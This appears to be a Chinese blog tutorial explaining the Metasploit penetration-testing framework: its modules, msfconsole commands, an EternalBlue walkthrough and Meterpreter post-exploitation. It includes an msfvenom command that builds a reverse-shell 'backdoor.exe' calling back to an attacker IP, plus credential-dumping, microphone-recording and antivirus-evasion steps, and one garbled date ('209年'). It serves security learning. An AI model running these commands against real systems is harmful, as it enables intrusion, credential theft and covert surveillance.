<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Metasploit 框架详解 | 1024 维度</title><meta name="author" content="TeaTang"><meta name="copyright" content="TeaTang"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Metasploit 框架 是一个广为人知且功能强大的开源渗透测试工具。它提供了一个全面的平台，用于开发、测试和执行漏洞利用（exploit）。无论是安全研究人员、渗透测试工程师还是红队成员，Metasploit 都是他们工具箱中不可或缺的一部分。  核心思想：将漏洞利用、载荷生成、后渗透模块等功能模块化，提供统一的接口和工具链，简化复杂的渗透测试流程。   一、Metasploit 简介1.1">
<meta property="og:type" content="article">
<meta property="og:title" content="Metasploit 框架详解">
<meta property="og:url" content="https://blog.tbf1211.xx.kg/29965d782f2a/index.html">
<meta property="og:site_name" content="1024 维度">
<meta property="og:description" content="Metasploit 框架 是一个广为人知且功能强大的开源渗透测试工具。它提供了一个全面的平台，用于开发、测试和执行漏洞利用（exploit）。无论是安全研究人员、渗透测试工程师还是红队成员，Metasploit 都是他们工具箱中不可或缺的一部分。  核心思想：将漏洞利用、载荷生成、后渗透模块等功能模块化，提供统一的接口和工具链，简化复杂的渗透测试流程。   一、Metasploit 简介1.1">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blog.tbf1211.xx.kg/img/cover/default_cover-11.jpg">
<meta property="article:published_time" content="2025-01-17T22:24:00.000Z">
<meta property="article:modified_time" content="2025-12-29T14:27:26.314Z">
<meta property="article:author" content="TeaTang">
<meta property="article:tag" content="计算机网络">
<meta property="article:tag" content="网络安全">
<meta property="article:tag" content="渗透测试">
<meta property="article:tag" content="2025">
<meta property="article:tag" content="Metasploit">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog.tbf1211.xx.kg/img/cover/default_cover-11.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Metasploit 框架详解",
  "url": "https://blog.tbf1211.xx.kg/29965d782f2a/",
  "image": "https://blog.tbf1211.xx.kg/img/cover/default_cover-11.jpg",
  "datePublished": "2025-01-17T22:24:00.000Z",
  "dateModified": "2025-12-29T14:27:26.314Z",
  "author": [
    {
      "@type": "Person",
      "name": "TeaTang",
      "url": "https://blog.tbf1211.xx.kg"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon-1.ico"><link rel="canonical" href="https://blog.tbf1211.xx.kg/29965d782f2a/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><meta name="google-site-verification" content="NdIUXAOVyGnnBhcrip0ksCawbdAzT0hlBZDE9u4jx6k"/><meta name="msvalidate.01" content="567E47D75E8DCF1282B9623AD914701E"/><meta name="baidu-site-verification" content="code-pE5rnuxcfD"/><link rel="stylesheet" href="/css/index.css?v=5.5.3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.7/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!true && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')

          if (theme === undefined) {
            if (mediaQueryLight.matches) activateLightMode()
            else if (mediaQueryDark.matches) activateDarkMode()
            else {
              const hour = new Date().getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            mediaQueryDark.addEventListener('change', () => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else {
            theme === 'light' ? activateLightMode() : activateDarkMode()
          }
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.json","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":true,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400,"highlightFullpage":true,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":150,"languages":{"author":"作者: TeaTang","link":"链接: ","source":"来源: 1024 维度","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Metasploit 框架详解',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="preconnect" href="https://jsd.012700.xyz"><link href="/self/btf.css" rel="stylesheet"><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="1024 维度" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/loading.gif" data-lazy-src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">443</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">225</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">80</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 我的轨迹</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/2023/"><i class="fa-fw fa-solid fa-bug"></i><span> 2023</span></a></li><li><a class="site-page child" href="/archives/2024/"><i class="fa-fw fa-solid fa-code"></i><span> 2024</span></a></li><li><a class="site-page child" href="/archives/2025/"><i class="fa-fw fa-solid fa-network-wired"></i><span> 2025</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa-solid fa-calendar-days"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/shuoshuo"><i class="fa-fw fas fa-comment"></i><span> 说说</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/cover/default_cover-11.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">1024 维度</span></a><a class="nav-page-title" href="/"><span class="site-name">Metasploit 框架详解</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 我的轨迹</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/2023/"><i class="fa-fw fa-solid fa-bug"></i><span> 2023</span></a></li><li><a class="site-page child" href="/archives/2024/"><i class="fa-fw fa-solid fa-code"></i><span> 2024</span></a></li><li><a class="site-page child" href="/archives/2025/"><i class="fa-fw fa-solid fa-network-wired"></i><span> 2025</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa-solid fa-calendar-days"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/shuoshuo"><i class="fa-fw fas fa-comment"></i><span> 说说</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Metasploit 框架详解</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2025-01-17T22:24:00.000Z" title="发表于 2025-01-18 06:24:00">2025-01-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">2.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><blockquote>
<p><strong>Metasploit 框架</strong> 是一个广为人知且功能强大的开源渗透测试工具。它提供了一个全面的平台，用于开发、测试和执行漏洞利用（exploit）。无论是安全研究人员、渗透测试工程师还是红队成员，Metasploit 都是他们工具箱中不可或缺的一部分。</p>
</blockquote>
<div class="note info flat"><p>核心思想：<strong>将漏洞利用、载荷生成、后渗透模块等功能模块化，提供统一的接口和工具链，简化复杂的渗透测试流程。</strong></p>
</div>
<hr>
<h2 id="一、Metasploit-简介"><a href="#一、Metasploit-简介" class="headerlink" title="一、Metasploit 简介"></a>一、Metasploit 简介</h2><h3 id="1-1-什么是-Metasploit？"><a href="#1-1-什么是-Metasploit？" class="headerlink" title="1.1 什么是 Metasploit？"></a>1.1 什么是 Metasploit？</h3><p>Metasploit 是由 <strong>Rapid7</strong> 公司维护的一个著名的开源项目。它是一个漏洞利用框架，旨在协助渗透测试人员识别、利用和验证漏洞。它不仅仅是一个简单的漏洞扫描器，更是一个提供多种工具和方法的集成环境，几乎覆盖了渗透测试的整个生命周期。</p>
<h3 id="1-2-Metasploit-的发展历史"><a href="#1-2-Metasploit-的发展历史" class="headerlink" title="1.2 Metasploit 的发展历史"></a>1.2 Metasploit 的发展历史</h3><ul>
<li><strong>2003年</strong>：由 H.D. Moore 发起，最初是一个 Perl 语言的项目。</li>
<li><strong>2004年</strong>：发布 2.0 版本，首次引入了模块化架构。</li>
<li><strong>2007年</strong>：框架被重写，使用 Ruby 语言，提高了灵活性和可维护性。</li>
<li><strong>209年</strong>：Rapid7 收购 Metasploit 项目，并继续其开发和维护。</li>
<li><strong>至今</strong>：Metasploit 已经成为渗透测试领域的黄金标准之一，拥有庞大的社区贡献和持续更新的漏洞利用模块。</li>
</ul>
<h3 id="1-3-Metasploit-的主要版本"><a href="#1-3-Metasploit-的主要版本" class="headerlink" title="1.3 Metasploit 的主要版本"></a>1.3 Metasploit 的主要版本</h3><p>Metasploit 提供多个版本，以满足不同用户的需求：</p>
<ul>
<li><strong>Metasploit Framework (MSF)</strong>：开源、免费的核心版本，包含所有基础的漏洞利用、载荷和辅助模块。通常在 Kali Linux 中默认安装。</li>
<li><strong>Metasploit Pro</strong>：商业版，提供图形用户界面（GUI）、自动化渗透测试、团队协作、报告生成以及与漏洞管理工具集成等高级功能。</li>
<li><strong>Metasploit Community</strong>：已停产，曾是免费的 Web 界面版本，提供了一些基础的自动化功能。</li>
</ul>
<h2 id="二、Metasploit-框架的核心组件"><a href="#二、Metasploit-框架的核心组件" class="headerlink" title="二、Metasploit 框架的核心组件"></a>二、Metasploit 框架的核心组件</h2><p>Metasploit 的强大之处在于其模块化的架构。它将各种功能分解为不同的模块类型，允许用户灵活组合和定制渗透测试流程。</p>
<h3 id="2-1-模块类型-Modules"><a href="#2-1-模块类型-Modules" class="headerlink" title="2.1 模块类型 (Modules)"></a>2.1 模块类型 (Modules)</h3><p>Metasploit 框架主要由以下几种模块组成：</p>
<ol>
<li><p><strong>Exploits (漏洞利用模块)</strong>：</p>
<ul>
<li>利用目标系统上的特定漏洞，尝试获取对目标机器的访问权限。</li>
<li>例如：<code>exploit/windows/smb/ms17_010_eternalblue</code> (永恒之蓝)</li>
<li>选择一个 Exploit 后，需要设置目标 (RHOSTS)、端口 (RPORT) 等参数。</li>
</ul>
</li>
<li><p><strong>Payloads (载荷模块)</strong>：</p>
<ul>
<li>当 Exploit 成功后，Payload 是在目标机器上执行的恶意代码。</li>
<li>Payload 的目标是建立一个与攻击者之间的连接，或者执行特定的操作（如添加用户、上传文件）。</li>
<li>常见的 Payload 类型包括：<ul>
<li><strong>命令行 Shell</strong>：如 <code>cmd/windows/reverse_tcp</code> (Windows 反向 Shell)。</li>
<li><strong>Meterpreter</strong>：Metasploit 自带的高级、功能丰富的交互式 Shell。</li>
<li><strong>Stage&#x2F;Stageless</strong>：<ul>
<li><strong>Staged (分阶段)</strong>：Payload 分为两部分。第一阶段很小，只负责建立连接并下载第二阶段（更大的功能性 Payload）。</li>
<li><strong>Stageless (非分阶段)</strong>：Payload 一次性传输所有代码。体积较大，但更稳定，不易被拦截。</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>Auxiliary (辅助模块)</strong>：</p>
<ul>
<li>用于执行扫描、枚举、指纹识别、拒绝服务攻击等辅助性任务，不直接导致漏洞利用。</li>
<li>例如：<ul>
<li><code>auxiliary/scanner/portscan/tcp</code> (TCP 端口扫描)。</li>
<li><code>auxiliary/scanner/smb/smb_version</code> (SMB 版本探测)。</li>
<li><code>auxiliary/scanner/ssh/ssh_login</code> (SSH 密码爆破)。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>Post (后渗透模块)</strong>：</p>
<ul>
<li>成功获取目标系统访问权限后，用于在目标机器上执行进一步操作的模块。</li>
<li>例如：<ul>
<li><code>post/windows/gather/enum_logged_on_users</code> (枚举已登录用户)。</li>
<li><code>post/windows/gather/hashdump</code> (获取用户哈希)。</li>
<li><code>post/windows/manage/migrate</code> (迁移进程)。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>Encoders (编码器)</strong>：</p>
<ul>
<li>用于对 Payload 进行编码，绕过杀毒软件的签名检测或避免坏字符 (bad characters) 干扰。</li>
<li>注意：编码器只改变 Payload 的签名，不提供加密功能。</li>
<li>例如：<code>x86/shikata_ga_nai</code> (经典的免杀编码器)。</li>
</ul>
</li>
<li><p><strong>Nops (空指令模块)</strong>：</p>
<ul>
<li>生成“无操作”指令 (No Operation)。通常用于填充缓冲区，以确保 Payload 位于内存中的可预测位置，辅助 Exploit 的稳定性，特别是在栈溢出攻击中。</li>
</ul>
</li>
</ol>
<h3 id="2-2-数据库支持"><a href="#2-2-数据库支持" class="headerlink" title="2.2 数据库支持"></a>2.2 数据库支持</h3><p>Metasploit 可以与 PostgreSQL 数据库集成，用于存储扫描结果、会话信息、漏洞数据等。这对于管理大规模渗透测试项目和生成报告非常有用。</p>
<ul>
<li><strong><code>db_status</code></strong>：查看数据库连接状态。</li>
<li><strong><code>db_connect</code></strong>：连接到数据库。</li>
<li><strong><code>hosts</code></strong>：列出已发现的主机。</li>
<li><strong><code>services</code></strong>：列出已发现的服务。</li>
<li><strong><code>vulns</code></strong>：列出已发现的漏洞。</li>
</ul>
<h2 id="三、Metasploit-控制台-msfconsole"><a href="#三、Metasploit-控制台-msfconsole" class="headerlink" title="三、Metasploit 控制台 (msfconsole)"></a>三、Metasploit 控制台 (msfconsole)</h2><p><code>msfconsole</code> 是与 Metasploit 框架交互的主要命令行界面。</p>
<h3 id="3-1-常用命令"><a href="#3-1-常用命令" class="headerlink" title="3.1 常用命令"></a>3.1 常用命令</h3><ul>
<li><strong><code>search [关键字]</code></strong>：搜索模块，例如 <code>search ms17-010</code>。</li>
<li><strong><code>use [模块路径]</code></strong>：选择一个模块，例如 <code>use exploit/windows/smb/ms17_010_eternalblue</code>。</li>
<li><strong><code>show options</code></strong>：显示当前模块的所有可用选项。</li>
<li><strong><code>set [选项名] [值]</code></strong>：设置模块选项，例如 <code>set RHOSTS 192.168.1.100</code>。</li>
<li><strong><code>setg [选项名] [值]</code></strong>：设置全局选项（对所有模块生效）。</li>
<li><strong><code>unset [选项名]</code></strong>：取消设置模块选项。</li>
<li><strong><code>unsetg [选项名]</code></strong>：取消设置全局选项。</li>
<li><strong><code>show payloads</code></strong>：显示当前 Exploit 可用的 Payload。</li>
<li><strong><code>set PAYLOAD [载荷路径]</code></strong>：选择 Payload，例如 <code>set PAYLOAD windows/meterpreter/reverse_tcp</code>。</li>
<li><strong><code>show targets</code></strong>：显示当前 Exploit 支持的目标操作系统版本。</li>
<li><strong><code>set TARGET [索引号]</code></strong>：设置目标索引。</li>
<li><strong><code>exploit</code> &#x2F; <code>run</code></strong>：执行当前选定的 Exploit 或 Auxiliary 模块。</li>
<li><strong><code>sessions</code></strong>：列出当前的 Meterpreter 会话。</li>
<li><strong><code>sessions -i [ID]</code></strong>：进入指定 ID 的 Meterpreter 会话。</li>
<li><strong><code>background</code></strong>：将当前 Meterpreter 会话放到后台。</li>
<li><strong><code>info</code></strong>：显示当前模块的详细信息，包括描述、引用、兼容的 Payload 等。</li>
<li><strong><code>check</code></strong>：在执行 Exploit 前，检查目标是否可能存在漏洞。</li>
<li><strong><code>quit</code> &#x2F; <code>exit</code></strong>：退出 msfconsole。</li>
</ul>
<h3 id="3-2-基本渗透流程示例-以-EternalBlue-为例"><a href="#3-2-基本渗透流程示例-以-EternalBlue-为例" class="headerlink" title="3.2 基本渗透流程示例 (以 EternalBlue 为例)"></a>3.2 基本渗透流程示例 (以 EternalBlue 为例)</h3><div class="mermaid-wrap"><pre class="mermaid-src" data-config="{}" hidden>
    graph TD
    A[启动 msfconsole] --&gt; B(search ms17-010)
    B --&gt; C(use exploit&#x2F;windows&#x2F;smb&lt;br&gt;&#x2F;ms17_010_eternalblue)
    C --&gt; D(show options)
    D --&gt; E(set RHOSTS 192.168.1.100)
    E --&gt; F(set LHOST 192.168.1.5 &lt;br&gt;监听地址，攻击机IP)
    F --&gt; G(set LPORT 4444 监听端口)
    G --&gt; H(show payloads)
    H --&gt; I(set PAYLOAD windows&lt;br&gt;&#x2F;meterpreter&#x2F;reverse_tcp)
    I --&gt; J{check - 检查漏洞是否存在}
    J -- 存在 --&gt; K(run &#x2F; exploit)
    K --&gt; L(等待Meterpreter会话建立)
    L --&gt; M(与目标进行后渗透操作)
    J -- 不存在或无法检测 --&gt; N(尝试其他Exploit或辅助模块)
  </pre></div>

<h2 id="四、Meterpreter-高级后渗透-Shell"><a href="#四、Meterpreter-高级后渗透-Shell" class="headerlink" title="四、Meterpreter - 高级后渗透 Shell"></a>四、Meterpreter - 高级后渗透 Shell</h2><p><strong>Meterpreter (Meta-Interpreter)</strong> 是 Metasploit 框架中最受欢迎和功能最强大的 Payload 之一。它是一个高级、动态且多功能的交互式 Shell，一旦在目标系统上运行，就能提供非常强大的后渗透能力。</p>
<h3 id="4-1-Meterpreter-的特点"><a href="#4-1-Meterpreter-的特点" class="headerlink" title="4.1 Meterpreter 的特点"></a>4.1 Meterpreter 的特点</h3><ul>
<li><strong>内存驻留 (In-Memory)</strong>：减少在磁盘上留下痕迹，提高隐蔽性。</li>
<li><strong>功能丰富</strong>：支持文件系统操作、进程管理、网络通信、提权、屏幕截图、键盘记录等。</li>
<li><strong>模块化和可扩展</strong>：可以在运行时动态加载扩展模块，实现更多功能。</li>
<li><strong>避免杀软检测</strong>：其 Stage&#x2F;Stageless 机制和多种编码选项有助于绕过检测。</li>
<li><strong>加密通信</strong>：通常使用 <code>staged</code> 或 <code>reverse_</code> 系列 Payload，与 <code>LHOST</code> 建立加密通信。</li>
</ul>
<h3 id="4-2-常用-Meterpreter-命令"><a href="#4-2-常用-Meterpreter-命令" class="headerlink" title="4.2 常用 Meterpreter 命令"></a>4.2 常用 Meterpreter 命令</h3><ul>
<li><strong><code>help</code></strong>：显示所有 Meterpreter 命令。</li>
<li><strong><code>sysinfo</code></strong>：查看目标系统信息。</li>
<li><strong><code>getuid</code></strong>：获取当前用户 ID。</li>
<li><strong><code>pwd</code></strong>：显示当前工作目录。</li>
<li><strong><code>ls</code> &#x2F; <code>dir</code></strong>：列出文件和目录。</li>
<li><strong><code>cd [目录]</code></strong>：切换目录。</li>
<li><strong><code>upload [本地文件] [远程路径]</code></strong>：上传文件到目标机器。</li>
<li><strong><code>download [远程文件] [本地路径]</code></strong>：从目标机器下载文件。</li>
<li><strong><code>execute -f [文件路径]</code></strong>：在目标机器上执行程序。</li>
<li><strong><code>ps</code></strong>：列出目标机器上的进程。</li>
<li><strong><code>migrate [PID]</code></strong>：将 Meterpreter 进程迁移到另一个进程 ID (PID)，用于提高稳定性或绕过检测。</li>
<li><strong><code>getsystem</code></strong>：尝试使用各种技术提权到 SYSTEM 权限。</li>
<li><strong><code>shell</code></strong>：切换到目标系统的命令行 Shell (例如 <code>cmd.exe</code> 或 <code>bash</code>)。</li>
<li><strong><code>hashdump</code></strong>：获取存储在 SAM 数据库中的用户哈希 (Windows)。</li>
<li><strong><code>load [扩展名]</code></strong>：加载 Meterpreter 扩展模块，例如 <code>load kiwi</code> (用于 Mimikatz 功能)。</li>
<li><strong><code>screenshot</code></strong>：截取目标机器屏幕。</li>
<li><strong><code>record_mic</code></strong>：录制目标机器麦克风。</li>
</ul>
<h2 id="五、Metasploit-的高级用法与功能"><a href="#五、Metasploit-的高级用法与功能" class="headerlink" title="五、Metasploit 的高级用法与功能"></a>五、Metasploit 的高级用法与功能</h2><h3 id="5-1-Evasion-规避"><a href="#5-1-Evasion-规避" class="headerlink" title="5.1 Evasion (规避)"></a>5.1 Evasion (规避)</h3><p>Metasploit 提供了编码器 (Encoders) 来混淆 Payload，尝试绕过杀毒软件和入侵检测系统 (IDS&#x2F;IPS)。但随着安全技术的进步，单独使用编码器往往不够，需要结合其他技术 (如签名修改、沙箱规避、文件捆绑等)。</p>
<h3 id="5-2-Sessions-会话管理"><a href="#5-2-Sessions-会话管理" class="headerlink" title="5.2 Sessions (会话管理)"></a>5.2 Sessions (会话管理)</h3><p><code>msfconsole</code> 可以同时管理多个 Meterpreter 会话。使用 <code>sessions</code> 命令可以查看、切换或杀死会话。</p>
<h3 id="5-3-Resource-Scripts-资源脚本"><a href="#5-3-Resource-Scripts-资源脚本" class="headerlink" title="5.3 Resource Scripts (资源脚本)"></a>5.3 Resource Scripts (资源脚本)</h3><p>可以将一系列 Metasploit 命令保存为 <code>.rc</code> 脚本文件。在 <code>msfconsole</code> 中使用 <code>resource [脚本文件]</code> 命令可以批量执行这些命令，实现自动化。</p>
<h3 id="5-4-Msfvenom"><a href="#5-4-Msfvenom" class="headerlink" title="5.4 Msfvenom"></a>5.4 Msfvenom</h3><p><code>msfvenom</code> 是 Metasploit 框架中的一个独立命令行工具，用于生成独立的 Payload。它结合了 <code>msfpayload</code> (Payload 生成) 和 <code>msfencode</code> (Payload 编码) 的功能。</p>
<ul>
<li><strong>用途</strong>：生成适用于各种平台和格式的恶意载荷（如 Windows EXE, Linux ELF, Web Shell, PowerShell 等）。</li>
<li><strong>示例</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o ~/Desktop/backdoor.exe</span><br></pre></td></tr></table></figure>
这条命令会生成一个 Windows 可执行文件，当在目标机器上运行时，会尝试与攻击者建立 <code>meterpreter/reverse_tcp</code> 连接。</li>
</ul>
<h3 id="5-5-Post-Exploitation-后渗透"><a href="#5-5-Post-Exploitation-后渗透" class="headerlink" title="5.5 Post-Exploitation (后渗透)"></a>5.5 Post-Exploitation (后渗透)</h3><p>Metasploit 的 Post 模块以及 Meterpreter 的强大功能使得后渗透阶段非常高效。这包括：</p>
<ul>
<li><strong>信息收集</strong>：枚举系统配置、网络信息、用户凭证。</li>
<li><strong>权限维持</strong>：创建后门、添加用户、修改注册表。</li>
<li><strong>横向移动</strong>：利用获取的凭证攻击同网络内其他机器。</li>
<li><strong>提权</strong>：利用内核漏洞或配置错误获取更高权限。</li>
</ul>
<h2 id="六、Metasploit-的局限性与风险"><a href="#六、Metasploit-的局限性与风险" class="headerlink" title="六、Metasploit 的局限性与风险"></a>六、Metasploit 的局限性与风险</h2><ol>
<li><strong>主动攻击风险</strong>：Metasploit 是一个攻击性工具，不当使用可能导致目标系统破坏、数据丢失或法律问题。</li>
<li><strong>不适用于零日漏洞</strong>：Metasploit 的 Exploit 通常针对已知漏洞。对于零日 (0-day) 漏洞，需要手动开发 Exploit。</li>
<li><strong>误报&#x2F;漏报</strong>：辅助模块的扫描结果可能存在误报或漏报，需要人工验证。</li>
<li><strong>可能被检测</strong>：Metasploit 生成的 Payload 和其网络通信模式可能被 EDR、IDS&#x2F;IPS 等安全设备检测到，需要更高级的规避技术。</li>
<li><strong>知识门槛</strong>：虽然 Metasploit 简化了漏洞利用过程，但有效使用它仍需要深入了解网络协议、操作系统原理和漏洞利用技术。</li>
</ol>
<h2 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h2><p>Metasploit 框架是一个不可多得的、集成度高的渗透测试利器。它以其模块化设计、丰富的漏洞利用库、强大的 Meterpreter 后渗透能力和易于使用的 <code>msfconsole</code> 界面，成为了网络安全领域从业人员的标配工具。通过系统学习和实践 Metasploit，可以极大地提升渗透测试的效率和广度，但同时必须牢记其风险，并秉持道德与法律原则进行使用。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://blog.tbf1211.xx.kg">TeaTang</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://blog.tbf1211.xx.kg/29965d782f2a/">https://blog.tbf1211.xx.kg/29965d782f2a/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 